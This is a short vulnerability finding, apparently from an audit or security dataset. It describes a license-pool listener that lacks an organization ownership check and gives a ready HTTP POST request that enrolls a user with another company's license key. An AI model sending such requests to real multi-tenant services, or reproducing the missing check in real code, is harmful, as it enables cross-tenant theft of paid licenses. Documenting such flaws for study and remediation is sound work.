diagnosis: The before_flush event listener consumes available seats from LicensePool based solely on requested_license_key without verifying pool.organization_id == member.organization_id. An organization administrator can supply another corporation's license key and consume their paid enterprise software licenses.
exploit_request:
POST /tenants/members/enroll HTTP/1.1
Host: admin.enterprisesoftware.io
Authorization: Bearer <unauthorized_org_admin_token>
Content-Type: application/json

{"email": "user@startup.io", "license_key": "LIC_FORTUNE500_UNLIMITED_2026"}
